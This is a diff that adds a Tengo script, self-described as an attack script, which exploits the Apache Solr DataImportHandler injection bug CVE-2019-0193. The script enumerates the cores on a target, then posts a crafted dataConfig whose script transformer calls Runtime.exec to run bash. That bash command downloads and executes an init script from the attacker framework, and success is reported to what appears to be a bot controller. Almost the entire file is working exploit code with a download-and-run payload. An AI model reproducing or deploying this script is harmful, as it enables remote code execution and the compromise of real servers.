@@ -1,0 +1,173 @@
+/*
+* This solr_rce_cve_2019_0193.tengo is an attack script that attacks target host by apache solr dataimport inject bugs
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+json := import("json")
+text := import("text")
+attack := import("attack")
+
+AttackName := "ApacheSolrAttackCVE_2019_0193"
+AttackType := "ApacheSolrAttackCVE_2019_0193"
+AttackInitScriptName := "init.sh"
+SolrDefaultCores := ["collection1","core","core1","test","new_core"]
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := proto == "https" ||port==443
+
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(core,cmd,result) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("ApacheSolr")
+    attackProcess.setName(AttackName)
+    attackProcess.setType(AttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload(cmd)
+    attackProcess.setResult(result)
+    attackProcess.setDetails(core)
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+
+//Get the solr all cores that created
+getSolrCores := func() {
+
+    request := http.newHttpRequest("get","/solr/admin/cores?wt=json").addHeader("User-Agent",UA)
+    response := client.send(request)
+
+    if response.getStatusCode() !=200 {
+        return {}
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return {}
+    }
+
+    if !text.contains(content,"responseHeader") ||!text.contains(content,"{")||!text.contains(content,"status") {
+
+        return {}
+    }
+
+    jsonData := json.decode(content)
+
+    if is_error(jsonData)||len(jsonData["status"])==0 {
+        return SolrDefaultCores
+    }
+
+    cores :=[]
+
+    for core,v in jsonData["status"] {
+        cores = append(cores,core)
+    }
+    return cores
+}
+
+//make attack payload
+mkPayload := func(core) {
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,AttackType)
+    pfmt:= `command=full-import&verbose=false&clean=false&commit=true&debug=true&core=%s&name=dataimport&dataConfig=
+            <dataConfig>
+            <dataSource type="URLDataSource"/>
+            <script><![CDATA[
+            function poc(row){
+            var process= java.lang.Runtime.getRuntime();
+            process.exec("bash,-c,%s".split(","));
+            return row;
+            }
+            ]]></script>
+            <document>
+            <entity name="stackoverflow"
+            url="https://stackoverflow.com/feeds/tag/solr"
+            processor="XPathEntityProcessor"
+            forEach="/feed"
+            transformer="script:poc" />
+            </document>
+            </dataConfig>`
+
+     return fmt.sprintf(pfmt,core,initDownloadCmd)
+}
+
+//do attack
+doAttack := func(core) {
+
+    url := fmt.sprintf("/solr/%s/dataimport?wt=json",core)
+
+    pload := mkPayload(core)
+
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/x-www-form-urlencoded")
+    request.addHeader("Connection","close")
+    request.putString(pload,false)
+
+    response := client.send(request)
+
+    if response.getStatusCode() !=200 {
+        return ""
+     }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return ""
+    }
+
+    if text.contains(content,"Requests"){
+        return content
+    }
+
+    return ""
+}
+
+
+
+main := func() {
+
+    cores := getSolrCores()
+
+    if len(cores) == 0 {
+        return false
+    }
+
+    //if the solr velocity template functions has been openned
+    for core in cores {
+
+        response := doAttack(core)
+
+        if response!="" {
+            sendAttackResult(core,"cbot_wget",response)
+            return true
+        }
+
+    }
+
+    return false
+}
+
+main()
+
+
+
